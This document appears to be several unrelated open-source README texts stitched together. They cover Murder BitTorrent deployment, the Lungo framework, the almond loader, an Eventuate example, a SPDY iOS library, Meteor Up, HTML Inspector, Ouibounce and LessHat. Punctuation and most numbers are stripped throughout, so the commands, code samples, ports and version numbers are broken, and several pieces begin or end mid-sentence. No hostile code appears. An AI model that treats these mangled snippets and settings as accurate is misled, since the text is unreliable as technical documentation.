transfer is started the seeder will be the first server many machines go to to get pieces these pieces will then be distributed in a tree fashion to the rest of the network but without necessarily getting the parts from the seeder peers this is the group of servers hundreds to tens of thousands which will be receiving the files and distributing the pieces amongst themselves once a peer is done downloading the entire tgz file it will continue seeding for a while to prevent a hotspot effect on the seeder configuration and usage  murder integrates with capistrano the most simple way to use it is as a deploy strategy by setting deployvia to murder by default murder makes the same assumptions that cap makes all servers without norelease true will act as peers additionally murder will automatically use the first peer as both tracker and seeder you may redefine the tracker  seeder and peer roles yourself to change these defaults for instance if you want to set up a dedicated all involved servers must have python installed and the related murder support files bittornado etc to upload the support files to the tracker seeder and peers run cap murder distributefiles by default these will go in shared and murder in your apps deploy directory override this by setting the variable remotemurderpath for convenience you can add an after hook to run this on deploy setup after deploy setup  murder distributefiles before deploying you must start the tracker cap murder starttracker to have this happen automatically during a deploy add the following hooks before murder startseeding  murder starttracker after murder stopseeding  murder stoptracker at this point you should be able to deploy normally cap deploy manual usage murder without a deploy strategy  murder can also be used as a general mechanism to distribute files across a generic set of servers to do so create a capfile require murder and manually define roles require rubygems require murder set remotemurderpath and opt and local and murder or some other directory role peer host  host  host  host  host  host  host role seeder host role tracker host to distribute a directory of files first make sure that murder is set up on all hosts then manually run the murder cap tasks  start the tracker cap murder starttracker  create a torrent from a directory of files on the seeder and start seeding scp r and files host and files cap murder createtorrent tag deploy filespath and files cap murder startseeding tag deploy  distribute the torrent to all peers cap murder peer tag deploy destinationpath and tmp  stop the seeder and tracker cap murder stopseeding tag deploy cap murder stoptracker when this finishes all peers will have the files in and tmp and deploy task reference  distributefiles scps a compressed version of all files from and dist the python bittorrent library and custom scripts to all server the entire directory is sent regardless of the role of each individual server the path on the server is specified by remotemurderpath and will be cleared prior to transferring files over starttracker starts the bittorrent tracker essentially a mini web server listening on port  stoptracker if the bittorrent tracker is running this will kill the process note that if it is not running you will receive an error createtorrent compresses the directory specified by the passed in argument filespath and creates a torrent file identified by the tag argument be sure to use the same tag value with any following commands any git directories will be skipped once completed the torrent will be downloaded to your local and tmp and tag tgz torrent downloadtorrent although not necessary to run if the file from createtorrent was lost you can redownload it from the seeder using this task you must specify a valid tag argument startseeding will cause the seeder machine to connect to the tracker and start seeding the ip address returned by the host bash command will be announced to the tracker the server will not stop seeding until the stopseeding task is called you must specify a valid tag argument which identifies the torrent in and tmp to use stopseeding if the seeder is currently seeding this will kill the process note that if it is not running you will receive an error if a peer was downloading from this seed the peer will find another host to receive any remaining data you must specify a valid tag argument stopallseeding identical to stopseeding except this will kill all seeding processes no tag argument is needed instructs all the peer servers to connect to the tracker and start download and spreading pieces and files amongst themselves you must specify a valid tag argument once the download is complete on a server that server will fork the download process and seed for  seconds while returning control to capistrano cap will then extract the files to the passed in destinationpath argument to destinationpath and tag and to not create this tag named directory pass in the notagdirectory  argument if the directory is empty this command will fail to clean it pass in the unsafepleasedelete  argument the compressed tgz in and tmp is never removed when this task completes all files have been transferred and moved into the requested directory stopallpeering sometimes peers can go on forever usually because of an error this command will forcibly kill all murderclient py peer commands that are config reference  variables  defaulttag a tag name to use by default such that a tag parameter doesn t need to be manually entered

2629802, a html framework for developers who want to design build and share cross device applications html optimized apps supports open web standards such as html css and javascript it brings a consistent browser environment across mobiles tvs and desktop devices open source project each new line of code in lungo is welcome we hope that developers and restless minds will help us to improve day by day this humble project powerful javascript api here are many ways to develop apps not all of them are optimized lungo offers you a robust api so you can have complete control of everything that happens in your app cross device full support it s known that creating apps for each platform is expensive this situation is increased by the arrival of tablets and smarttvs lungo will suit all of them creating a unique and amazing ux current version    getting started  this is opensource so feel free to fork this project to help us create a better framework all source code is developed with coffeescript and stylus but don t worry we worship clean code so you can quickly get to make your own modifications in it easy prototype  the main premise is to create a semantic structure in the whole project starting from the markup language html through a well organized css and ending with the javascript api lungo offers a great facility when prototyping applications and will not be needed to enter any lines of code javascript to visualize how our application will behave in this doc we will learn which are lungo semantic elements as relate to each and how you can create applications with html only it s really exciting let s begin structure  here you have the dependencies of your lungo application s body it must contain at least link rel stylesheet href components and lungo brownie and lungo css link rel stylesheet href components and lungo icon and lungo icon css link rel stylesheet href components and lungo brownie and lungo theme css section id main your content and article and section the javascript function that initializes lungo it s javascript lungo init to make easier to create and modify your app you can create the sections in separate html files and load the synchonously making your main file smaller and having your code organized better javascript and and load resource on app init lungo init name example  resources sectiontoload html section id loader data transition go to section and article and section basic elements  lungo uses the semantic language markup introduced with html so you can add this elements using the new semantic tags section id main content and article and section section id mainsection header data title example and header content and article and section each section can contain a header where the tittle of the section will be shown optionally you can add navigation buttons to go to another section go back to a previous one go to another article or just open the aside menu section id mainsection header data title example and header content and article and section each section can contain a footer there you can add buttons to navigate through articles sections and even asides section id mainsection content and article footer nav and nav and footer and section header data title options and header content and article in your section if you want view aside automaticaly in tablet apps you need link your aside with data aside attribute and you can display and hide with attribute data view aside section id mainsection data aside features header data title aside nav button data view aside features

header footer nav and nav and footer and section section id second header data back home data title example and header and section lungo gives you the capability to have a special menu at the top of your ui to do this you have to extend the header element using class extended and create inside of it a nav element with class groupbar section id main header data title groupbar class extended and header nav data control groupbar and nav and section besides nav elements and groupbar there is another way to make the user select new view in your application since brownie v  implements menu

second data icon right and button and nav and header and section we know that forms have always been somewhat tedious to handle in web projects lungo makes easy create a uniform base and unique experience among all browsers all controls from the input in any of its variants to the button are perfectly adapted for use with touch devices you only have to use the form or class form fieldset label input and label input type text placeholder value label input styled and label input type text placeholder value on right class text alignright error label select and label label class select select option value  html and option option value  css and option option value  javascript and option and select and label label input date and label label class anchor example of touch checkbox and label and fieldset can you imagine an app without lists we can t conceive of such a thing so in lungo offers you an multiple components to make lists tailored to your needs always keeping in mind that everything starts with a ul and continous with a li strong title and strong small description and small and article our li element can be filled by multiple ways and how complex it all you want check out a list item much more complete li class thumb big strong title and strong span class text tiny opacity lorem ipsum and span small lorem ipsum dolor sit amet consectetur adipisicing elit neque aliquam nisi commodi blanditiis and small and div if you want to know more about the possible styles of the lists have to study the examples in our wonderful kitchen sink javascript api  lungo has several methods that are used inside its engine here you have them if you need to include some of their functionality in your application console system to display messages when you are in debug mode

2238128, some developers like to use the amd api to code modular javascript but after doing an optimized build they do not want to include a full amd loader like requirejs since they do not need all that functionality some use cases like mobile are very sensitive to file sizes by including almond in the built file there is no need for requirejs almond is around  kilobyte when minified with closure compiler and gzipped since it can support certain types of loader plugin optimized resources it is a great their project but get a tiny download in one file after using the if you are building a library the wrap true support in the requirejs optimizer will wrap the optimized file in a closure so the define and require amd api does not escape the file users of your optimized file will only see the global api you decide to export not the amd api see the usage section below for more details so you get great code cleanliness with amd and the use of powerful loader plugins in a tiny wrapper that makes it easy for others to use your code even if they do not use amd it is best used for libraries or apps that use amd and optimize all the modules into one file no dynamic code loading all modules have ids and dependency arrays in their define calls the requirejs optimizer will take care of this for you only have one requirejs config or require config call do not use require tourl or require nametourl what is supported dependencies with relative ids define id  definitions define  require and requirejs calls loader plugins that can inline their resources into optimized files and can access those inlined resources synchronously after the optimization pass node r js o baseurl name path and to and almond include main out main built js wrap true this assumes your project s top level script file is called main js and the command wrap true will add this wrapper around the main built js contents which will be minified by uglifyjs function and and almond will be here and and main and its nested dependencies will be here  if you do not want that wrapper leave off the wrap true argument these optimizer arguments can also be used in a build config object so it can be used as of requirejs   and almond   modules are only executed if they are called by a top level require call the data main attribute on a script tag for require js counts as a top level require call however with almond it does not look for a data main attribute and if your main js module does not use a top level require or requirejs call to trigger module loading and execution after a build it may appear that the code broke no modules execute the   requirejs optimizer has a build config option insertrequire that you can use to specify that a require call is inserted at the end of the built file to trigger module loading example node r js o baseurl name path and to and almond js include main insertrequire main out main built js wrap true or if using a build config file javascript baseurl  name path and to and almond  include main  insertrequire main  out main built js  wrap true this will result with require main at the bottom of main built js if you are making a library that is made up of amd modules in source form but will be built with almond into one file and you want to export a small public api for that library you can use the wrap build config to do so build javascript baseurl  name path and to and almond  include main  out lib built js  wrap startfile path and to and start frag  endfile path and to and end frag where start frag could look like this javascript function root factory if typeof define function define amd and and allow using this built library as an amd module and and in another project that other project will only and and see this amd call not the internal modules in and and the closure below define  factory else and and browser globals case just assign the and and result to a property on the global root libglobalname factory this function and and almond and your modules will be inlined here and end frag is like this javascript and and the modules for your project will be inlined above and and this snippet ask almond to synchronously require the and and module value for main here and return it as the and and value to use for the public api for the built file return require main after the build then the built file should be structured like so start frag almond js modules for your lib including main end frag explanations of common errors in almond    and earlier this would show up as deps is undefined  where this line is mentioned if deps splice in    and the error is explicitly incorrect module build no module name this means that there is a define d module but it is missing a name something that looks like this define function define  function when it should look like define somename  function define somename   function this is usually a sign that the tool you used to combine all the modules together did not properly name an anonymous amd module multiple modules built into a single file must have names in the define calls otherwise almond has no way to assign the module to a name key for use in the code the fix is to use a build tool that understand amd modules and inserts the module ids in the build the that can do this correctly it means that module x asked for module y  but module y was not available this usually means that y was not included in the built file that includes almond almond can only handle modules built in with it it cannot dynamically load modules from the network it means that a require y call was done but y was not available this usually means that y was not included in the built file that includes almond almond can only handle modules built in with it it cannot dynamically load modules from the network almond follows the and is considered a sub project of requirejs
28677272, this talk describes a way of architecting highly scalable and available applications that is based on microservices polyglot persistence event sourcing es and command query responsibility segregation cqrs applications consist of loosely coupled components that communicate using events these components can be deployed either as separate services or packaged as a monolithic application for simplified development and testing this example illustrates several important concepts how to decompose an application into microservices as described below the application consists of several services for example bank accounts are managed by one service money transfers by another service using an event driven architecture to achieve data consistency rather than using traditional distributed transaction to maintain database consistency this application uses an eventually consistent event driven approach using event sourcing to implement the event driven architecture the domain logic consists of domain driven design ddd aggregates that using event sourcing using command query responsibility segregation cqrs update requests http posts and puts and view requests http gets are handled by separate services how event sourcing enables deployment flexibility the application can either be deployed as a monolith or as microservices this example application provides a rest api for creating and viewing bank accounts and transferring money between them the following diagram shows the architecture there are the following services customers service rest api for creating customers accounts service rest api for creating accounts transactions service rest api for transferring money customers view service subscribes to events and updates a mongodb view and provides an api for retrieving customers accounts view service subscribes to events and updates a mongodb view and provides an api for retrieving accounts there are currently the following versions of the example application java spring a java and spring boot example scala spring a scala and spring boot example note this version is lagging the java spring and hasn t been updated in a longtime other examples will be added shortly including a scala and play example for more information please see the wiki and and wiki it provides a simple yet powerful event driven programming model that is based on event sourcing and command query responsibility segregation cqrs eventuate solves the distributed data management problems inherent in a microservice architecture it consists of a scalable distributed event store and client libraries for various languages and frameworks including java scala and the spring framework there are two versions of eventuate there is also an embedded test event store which is great for integration tests this is a gradle project however you do not need to install gradle since it will be downloaded automatically you just need to have java  installed the details of how to build and run the services depend slightly on whether you are using eventuate saas or eventuate local next build the application cd java spring and gradlew assemble docker compose up d note dockerhostip is the ip address of the machine where docker is running e g the ip address of the virtualbox vm first build the application cd java spring and gradlew assemble p eventuatedriver local export dockerhostip docker compose f docker compose eventuate local yml up d note you need to set dockerhostip before running docker compose this must be an ip address or resolvable hostname it cannot be localhost

sending one request at a time over one tcp connection spdy can issue many requests simultaneously over a single tcp session and handle responses in any order as soon as they re available second spdy compresses both request and response headers headers are often nearly identical to each other across requests generally contain lots of duplicated text and can be quite large this makes them an ideal candidate for compression sup  and sup finally spdy introduces server push sup  and sup this can allow a server to push content that the client doesn t know it needs yet such content can range from additional assets like styles and images to notifications about realtime events  please see the note below about the crime attack  not currently supported in this framework but coming soon the spdy framework is designed to work seamlessly with your existing apps and projects if you are using the nsurl stack to issue requests or any library that provides an abstraction over it like afnetworking  you can simply add the spdy framework bundle to your project link it to your targets and enable the protocol the framework contains a multi architecture and multi platform fat binary that supports versions of ios  and above and os x lion and above as well as all hardware capable of running those operating systems when you distribute your application the size of the included binary will be dramatically reduced provided you have code stripping enabled to use the spdy framework you ll need to link cfnetwork framework and libz dylib in your project this can be done in the link binary with libraries section under build phases for your compilation target the way you enable spdy in your application will be slightly different depending on whether you are using nsurlconnection or nsurlsession to manage your http calls in order to cause requests issued via the nsurlconnection stack to be carried over spdy you ll make a method call to specify one or more origins protocol host port tuple to be handled by spdy import spdy and spdyprotocol h note that origins containing http vs https are distinct from each other will be handled by separate spdy sessions and must be registered independently only sessions for origins containing https will be encrypted with tls for nsurlsession you can configure sessions to use spdy via nsurlsessionconfiguration import spdy and spdyprotocol h nsurlsessionconfiguration configuration nsurlsessionconfiguration defaultsessionconfiguration configuration protocolclasses spdyurlsessionprotocol class you can freely use either or both methods and existing spdy sessions will be shared across both networking stacks if you do use the former approach note that registered origins will also be handled by spdy with the default nsurlsession either of the above one liners is all you need to do to shift http requests transparently over to spdy of course you still need a server that speaks spdy some possibilities are most existing spdy implementations use a tls extension called next protocol implementation npn to negotiate spdy instead of http unfortunately this extension isn t supported by secure transport apple s tls implementation  and so in order to use spdy in your application you ll either need to issue requests to a server that s configured to speak spdy on a dedicated port or use a server that s smart enough to examine the incoming request and determine whether the connection will be spdy or http based on what it looks like at twitter we do the latter but the former solution may be simpler for most applications in order to aid with protocol inference this spdy implementation includes a non standard settings id at index  settingsminorversion this is necessary to differentiate between spdy and  and spdy and   connections that were not negotiated with npn since only the major version is included in the frame header because not all servers may support this particular setting sending it can be disabled at runtime through protocol configuration in the context of an application that doesn t issue arbitrary requests this is less likely to be an issue however before you ship a project with header compression enabled you should understand the details of this attack and whether your application could be vulnerable if you wish to compile the framework yourself the process is fairly straightforward and the build process should just work out of the box in xcode however there are still a couple of things to note prior to xcode  if you wanted to compile the framework to a dual platform binary as in the distribution version  you were required to set ios device as your platform target for the framework this was due to a quirk in the xcode build process that would otherwise exclude some but not all versions of the arm architecture from the final binary with the release of xcode  any platform target should result in the same final universal binary the setting is essentially ignored to create this binary the build process actually depends on several static library targets and uses lipo to combine them we are always looking for people to get involved with the project in the near future we will be working on please feel free to send us a pull request to add yourself to this list bonus points to link to a tweet copyright  twitter inc and other contributors

mongodb on the server does not destroy the local mongodb on future setups setupmongo true and and warning node js is required only skip if you already have node js installed on server setupnode true and and warning nodeversion defaults to    if omitted do not use v just the version number nodeversion     and and install phantomjs on the server setupphantom true and and show a progress bar during the upload of the bundle to the server and and might cause an error in some rare cases if set to true for instance in shippable ci enableuploadprogressbar true and and application name no spaces

mongodb and and arunoda fddsjsfh hanso mongohq com  and myapp  mailurl smtp and and postmaster myapp mailgun org adjsjhds smtp mailgun org  and and and meteor up checks if the app comes online just after the deployment and and before mup checks that it will wait for the number of seconds configured below deploycheckwaittime  mup setup this will setup the server for the mup deployments it will take around   minutes depending on the server s performance and network availability mup deploy this will bundle the meteor project and deploy it to the server meteor up checks if the deployment is successful or not just after the deployment by default it will wait  seconds before the check you can configure the wait time with the deploycheckwaittime option in the mup json this only tested with mac and linux with the help of ssh agent  mup can use ssh keys encrypted with a passphrase here s the process first remove your pem field from the mup json so your mup json only has the username and host only then start a ssh agent with eval ssh agent then you ll asked to enter the passphrase to the key after that simply invoke mup commands and they ll just work once you ve deployed your app kill the ssh agent with ssh agent k if your username is root  you don t need to follow these steps please ensure your key file pem is not protected by a passphrase also the setup process will require nopasswd access to sudo since meteor needs port  sudo access is required make sure you also add your ssh key to the and yourusername and ssh and authorizedkeys list you can add your user to the sudo group sudo adduser username sudo and you also need to add nopasswd to the sudoers file sudo visudo replace this line sudo all all all by this line sudo all all nopasswd all when this process is not working you might encounter the following error sudo no tty present and no askpass program specified this is how meteor up will configure the server for you based on the given appname or using meteor as default appname this information will help you customize the server for your needs mongodb installed and bound to the local interface cannot access from the outside you can use an array to deploy to multiple servers at once to deploy to different environments e g staging production etc  use separate meteor up configurations in separate directories with each directory containing separate mup json and settings json files and the mup json files app field pointing back to your app s local directory sometimes you might be using mrt  or meteor from a git checkout by default meteor up uses meteor you can ask meteor up to use the correct binary with the meteorbinary option meteorbinary and bin and meteor and meteor mup logs f mup can tail logs from the server and supports all the options of tail after you ve edit environmental variables or settings json  you can reconfigure the app without deploying again use the following command to do update the settings and restart the app mup reconfig if you want to stop start or restart your app for any reason you can use the following commands to manage it mup stop mup start mup restart you can t access the mongodb from the outside the server to access the mongodb shell you need to log into your server via ssh first and then run the following command mongo appname it is possible to provide server specific environment variables add the env object along with the server details in the mup json here s an example servers host hostname  username root  password password  env someenv the value meteor up supports multiple deployments to a single server meteor up only does the deployment if you need to configure subdomains you need to manually setup a reverse proxy yourself let s assume we need to deploy production and staging versions of the app to the same server the production app runs on port  and the staging app runs on port  we need to have two separate meteor up projects for that create two directories and initialize meteor up and add the necessary configurations in the staging mup json  add a field called appname with the value staging you can add any name you prefer instead of staging since we are running our staging app on port  add an environment variable called port with the value  now setup both projects and deploy as you need then purchase a ssl certificate then generate a ssl certificate from your ssl providers ui then that ll ask to provide the csr file upload the csr file we ve generated when asked to select your ssl server type select it as nginx then you ll get a set of files your domain certificate and ca files then add following configuration to your mup json file ssl pem and ssl pem  and and backendport  now simply do mup setup and now you ve the ssl support by default it ll think your meteor app is running on port  if it s not change it with the backendport configuration field ssl terminator will run on the default ssl port  right now you can t have multiple ssl terminators running inside a single server to update mup to the latest version just type npm update mup g you should try and keep mup up to date in order to keep up with the latest meteor changes but note that if you need to update your node version you ll have to run mup setup again before deploying your issue might not always be related to meteor up so make sure you can connect to your instance first and that your credentials are working properly if you suddenly can t deploy your app anymore first use the mup logs f command to check the logs for error messages one of the most common problems is your node version getting out of date in that case see  updating section above if you need to see the output of meteor up to see more precisely where it s failing or hanging for example  run it like so debug mup command where command is one of the mup commands such as setup  deploy  etc some of the meteor core packages as well some of the community packages comes with npm modules which has been written in c or c and and these modules are platform dependent so we need to do special handling before running the bundle generated from meteor bundle meteor up uses the meteor bundle fortunately meteor up will take care of that job for you and it will detect binary npm modules and re build them before running your app on the given server meteor   adds a similar feature where it allows package developers to publish their packages for different architecures if their packages has binary npm modules as a side effect of that if you are using a binary npm module inside your app via meteorhacks npm package you won t be able to deploy into meteor com but you ll be able to deploy with meteor up since we are re building binary modules on the server

7491531,  getting started getting started  configuring html inspector configuring html inspector  built in rules built in rules  writing your own rules writing your own rules  overriding rules configurations overriding rule configurations  browser support browser support  running the tests running the tests  contributing contributing  faqs faqs  third party rules third party rules html inspector is a highly customizable code quality tool to help you and your team write better markup it aims to find a balance between the uncompromisingly strict wc validator and having absolutely no rules at all the unfortunate reality for most of us html inspector is opinionated but every rule is completely customizable so you can take what you like and change what you don t it s also easy to extend allowing teams to write their own rules to enforce their chosen conventions npm install g html inspector htmlinspector path and to and file html htmlinspector help bower install html inspector if you clone the github repo just use the file named html inspector js in the project root once html inspector is added you can run htmlinspector inspect to see the results calling inspect with no options will load all rules and run them with their default configuration options script htmlinspector inspect and script after the script runs any errors will be reported to the console unless you change this behavior here s an example of what you might see make sure you call inspect after any other dom altering scripts have finished running or those alterations won t get inspected by default html inspector runs all added rules starts traversing from the html element and logs errors to the console when complete but all of this can be customized the inspect method takes a config object to allow you to change any of this behavior here are the config options domroot selector and element the dom element to start traversing from userules array a list of rule names to run when inspecting defaults to running all rules not excluded via excluderules excluderules array a list of rule names not to run when inspecting if userules and excluderules are both set the excluded rules are removed from the list of rules to use excludeelements selector and element and array any dom element that matches the selector element or list of selectors and elements will be excluded from traversal note its descendants will still be traversed excludesubtrees selector and element and array the descendants of any dom element that matches the selector element or list of selectors and elements will be excluded from traversal oncomplete function the callback to be invoked when the inspection is finished the function is passed an array of errors that were reported by individual rules here are the default configuration values config domroot html  userules null excluderules null excludeelements svg  excludesubtrees svg  iframe  oncomplete function errors errors foreach function error console warn error message error context here is how you might override the default configurations htmlinspector inspect domroot body  excluderules some rule name  some other rule name  excludeelements svg  iframe  oncomplete function errors errors foreach function error and and report errors to external service for convenience some of the config options may be passed as single arguments if inspect receives an argument that is an array it is assumed to be the userules option if it s a string or dom element it s assumed to be the domroot option and if it s a function it s assumed to be the oncomplete callback and and only set the userules options htmlinspector inspect some rule name  some other rule name and and only set the domroot htmlinspector inspect content and and only set the oncomplete callback htmlinspector inspect function errors errors foreach function error and and report errors to an external service html inspector ships with a set of built in rules that fall into one of three main categories validation best practices and convention each rule is registered via a unique string identifier that can be used to include or exclude it at inspection time here is the full list of built in rules by their identifiers validate elements validate element location validate attributes duplicate ids unique elements inline event handlers script placement unused classes unnecessary elements bem conventions the following is a more in depth explanation of each rule html inspector is different than a markup validator validators parse static markup while html inspector runs on a live dom this makes it a lot more powerful but there are some drawbacks as well because html inspector runs after the browser has parsed your html any mistakes the browser has forgiven will not be seen by html inspector as a result html inspector should not be seen as a replacement for validation it s simply another tool in the toolbox that being said there is still a lot that it can do and does to validate your markup here are the validation rules that ship with html inspector expect this list to get more comprehensive in the future validate elements inspects each element in the dom and reports any elements that are invalid or obsolete this will catch simple things like misspelled tags il instead of li  and it will inform you of deprecated tags like center  font  and more recently hgroup any element you don t want to be warned about can be whitelisted validate attributes like validating elements this rule will let you know if you re using attributes that don t belong on a particular element or perhaps don t belong on any element if your project uses custom attributes like ng in angularjs  these can be whitelisted duplicate ids warn if non unique ids are found on the same page unique elements warn if elements that should be unique like title and main appear more than once in the document some markup may be perfectly valid but uses practices that are commonly considered to be poor or outdated the following rules check for these types of things note that everything in this list is subjective and optional inline event handlers warn if inline event handlers like onclick return false are found in the document inline event handlers are hard to manage hard to debug and completely non reusable script placement warn if script elements appear anywhere other than right before the closing and body tag because javascript is a blocking resource adding script elements anywhere other than the end of the document may delay the loading of the page if a script must appear somewhere other than the end of the document it can be whitelisted unused classes sometimes you ll remove a css rule from your stylesheet but forget to remove the class from the html the unused classes rule compares all the class selectors in the css to the classes in the html and reports any that aren t being used the real power of html inspector lies in its ability to enforce your team s chosen conventions if you ve decided that all groups of links should be contained in a nav element or all section elements must contain a heading you can write those rules and an error will be thrown when someone breaks them because conventions are usually specific to individual teams there s only one built in rule in this category but hopefully it ll get you thinking about rules your team could use this rule throws an error when an element class name is used but that element isn t a descendant of a block by the same name it also errors when a modifier is used on a block or element without the unmodified class there too rules are the bread and butter of html inspector they are where you check for problems and report errors here s how you add new rules htmlinspector rules add name config  func name string the name parameter is a string used to identify the rule it must be unique config optional object the config parameter stores configuration data that is used by the rule anything that users of your rule might want to customize themselves should be set in the config object func function the func parameter is an initialization function that is invoked as soon as you call htmlinspector inspect the function is passed three arguments listener  reporter  and config the listener object is used to subscribe to events that are triggered as html inspector is traversing the dom when problems are found they can be reported to the reporter object the config object is the same config that was passed to htmlinspector rules add  though its properties may have been customized by other users between then and now the listener object can subscribe to events via the on method like with many other event binding libraries on takes two parameters the event name and a callback function listener on event callback event string the name of the event see below for a complete list of events callback function a function to be invoked when the event occurs the function will be passed certain arguments depending on the event type see the event list below for argument details here is an example of binding a function to the class event listener on class  function classname domelement if classname foo and element nodename tolowercase bar and and report the error below is a complete list of events along with the arguments that are passed to their respective handlers for events that occur on a dom element that element is passed as the final argument it is also bound to the this context beforeinspect domroot element elementname domelement id idname domelement class classname domelement attribute attrname attrvalue domelement afterinspect domroot when you find something in the html that you to want warn about you simply call the warn method on the reporter object reporter warn rule message context rule string the rule name identifier message string the warning to report context mixed the context in which the rule was broken this is usually a dom element or collection of dom elements but doesn t have to be it can be anything that helps the user track down where the error occurred reporter warn validate elements  the and name and element is not a valid html element  element imagine your team previously used the custom data attributes data foo and data bar  but now the convention is to use something else here s a rule that would warn users when they re using the old convention htmlinspector rules add deprecated data prefixes  deprecated foo  bar function listener reporter config and and register a handler for the attribute event listener on attribute  function name value element var prefix and data a z and and test name regexp  and and return if there s no data prefix if prefix return and and loop through each of the deprecated names from the and and config array and compare them to the prefix and and warn if they re the same config deprecated foreach function item if item prefix reporter warn deprecated data prefixes  the data and item and prefix is deprecated  element   individual rules may or may not do exactly what you need which is why most rules come with a configurations object that users can customize a rule s configuration can be changed to meet your needs via the extend method of the htmlinspector rules object htmlinspector rules extend rule overrides rule string the rule name identifier overrides object and function an object or function that returns an object to be merged with the rule s config object if overrides is a function it will be passed the rule s config object as its first argument here are two examples overriding the deprecated data prefixes rule defined above the first example passes an object and the second passes a function and and using an object htmlinspector rules extend deprecated data prefixes  deprecated fizz  buzz and and using a function htmlinspector rules extend deprecated data prefixes  function config return deprecated config deprecated concat bazz here are a few more examples the following override the defaults of a few of the built in rules and and use the inuit css bem naming convention htmlinspector rules extend bem conventions  methodology inuit and and add twitter generated classes to the whitelist htmlinspector rules extend unused classes  whitelist and js and tweet and html inspector has been tested and known to work in the latest versions of all modern browsers including chrome firefox safari opera and internet explorer it will not work in older browsers that do not support es methods the css object model or console warn since html inspector is primarily a development tool it is not intended to work in browsers that aren t typically used for development and don t support modern web standards if you need to test your site in older versions of ie and don t want to see javascript errors simply wrap all your html inspector code inside a conditional comment so it is ignored by ie and below here is an example script htmlinspector inspect and script if grunt and all the dependencies are installed you can run the tests with the following command grunt test if you want to run the browser tests in a real browser instead of via phantomjs simply fire up a local server and load the tests and html inspector test html file make sure to run grunt test beforehand as it builds the tests i m always open

15263202, ouibounce a small library enabling you to display a modal before a user leaves your website this library helps you increase landing page conversion rates from my experience you can expect a lift of  to  depending on your audience traffic type paid or unpaid and copy talking about copy please use ouibounce to provide value to your visitors with tools like these it s very easy to create something spammy looking not sure what i mean by provide value here are a few ideas to get your creative juices flowing free ebook upcoming webinar invite exclusive access to xyz i ve designed a few modals just for you feel free to use these as inspiration you have a few options to choose from download the minified build and ouibounce min js or unminified build and ouibounce js script and include it on your page use npm npm install ouibounce  create a hidden modal  select the modal with vanilla javascript or jquery and call ouibounce  optional save the function s return value to use the public api allowing you to fire or disable ouibounce on demand example  ouibounce document getelementbyid ouibounce modal example with jquery  ouibounce ouibounce modal  example using the public api  var modal ouibounce document getelementbyid ouibounce modal modal fire ouibounce offers a few options such as ouibounce fires when the mouse cursor moves close to or passes the top of the viewport you can define how far the mouse has to be before ouibounce fires the higher value the more sensitive and the more quickly the event will fire defaults to   example  ouibounce document getelementbyid ouibounce modal  sensitivity  by default ouibounce will only fire once for each visitor when ouibounce fires a cookie is created to ensure a non obtrusive experience there are cases however when you may want to be more aggressive as in you want the modal to be elegible to fire anytime the page is loaded and reloaded an example use case might be on your paid landing pages if you enable aggressive  the modal will fire any time the page is reloaded for the same user example  ouibounce document getelementbyid ouibounce modal  aggressive true by default ouibounce won t fire in the first second to prevent false positives as it s unlikely the user will be able to exit the page within less than a second if you want to change the amount of time that firing is surpressed for you can pass in a number of milliseconds to timer example  ouibounce document getelementbyid ouibounce modal  timer  by default ouibounce will show the modal immediately you could instead configure it to wait x milliseconds before showing the modal if the user s mouse re enters the body before delay ms have passed the modal will not appear this can be used to provide a grace period for visitors instead of immediately presenting the modal window example  and and wait  ms ouibounce document getelementbyid ouibounce modal  delay  you can add a callback which is a function that will run once ouibounce has been triggered by using the callback option example  ouibounce document getelementbyid ouibounce modal  callback function console log ouibounce fired ouibounce sets a cookie by default to prevent the modal from appearing more than once per user you can add a cookie expiration in days using cookieexpire to adjust the time period before the modal will appear again for a user by default the cookie will expire at the end of the session which for most browsers is when the browser is closed entirely example  ouibounce document getelementbyid ouibounce modal  cookieexpire  ouibounce sets a cookie by default to prevent the modal from appearing more than once per user you can add a cookie domain using cookiedomain to specify the domain under which the cookie should work by default no extra domain information will be added if you need a cookie to work also in your subdomain like blog example com and example com  then set a cookiedomain such as example com notice the dot in front example  ouibounce document getelementbyid ouibounce modal  cookiedomain example com you can specify cookie name passing cookiename customcookiename example  ouibounce document getelementbyid ouibounce modal  cookiename customcookiename you can drop sitewide cookies by using passing sitewide true example  ouibounce document getelementbyid ouibounce modal  sitewide true the options are just javascript objects you can therefore combine multiple options example  ouibounce document getelementbyid ouibounce modal  aggressive true sitewide true cookiedomain example com  timer  callback function console log ouibounce fired if you save the object returned by the ouibounce function you get access to a small public api use this api to fire or disable ouibounce on demand example  var modal ouibounce document getelementbyid ouibounce modal modal fire and and fire the ouibounce event modal disable and and disable ouibounce it will not fire on page exit modal disable cookieexpire  sitewide true and and disable ouibounce sitewide for  days the disable function accepts a few options var ouibounce ouibounce false callback function console log ouibounce fired this library provides no guarantees if

get started get started and introduction intro and contribute contribute and documentation documentation and meet the best mixins library in the world no restrictions  if it s possible in css it must be possible to be done with a mixin unlimited number of anything shadows gradients gradient swatches standard naming convention  in lesshat mixins have names like all css properties no rounded or shadow it s stupid cross browser  lesshat takes care of exporting css for all available browsers bootstrap friendly  you can now use prefixed lesshat version and gaily work with bootstrap yeah it s that easy keyframes  although it s tricky as hell but yeah lesshat has mixin for keyframes blank state ready  if you call mixin without any arguments lesshat does not pollute your css with empty properties instead lesshat generates nothing  typical lesshat mixin supermixin process function webkit border radius process border radius process  use almost every property without interpolation correct mixin calling background image linear gradient to bottom fbfa   ecec  incorrect calling background image linear gradient to bottom fbfa   ecec  unfortunately there are exceptions keyframes calc selection and and in some cases you have to interpolate border radius or less css begins to play on calculator border radius px and px  download this repo  npm install  if you create new mixin use grunt generate command  if it s possible almost always test the coverage for new mixins and never break existing tests  commits should represent one logical change each if a mixin goes through

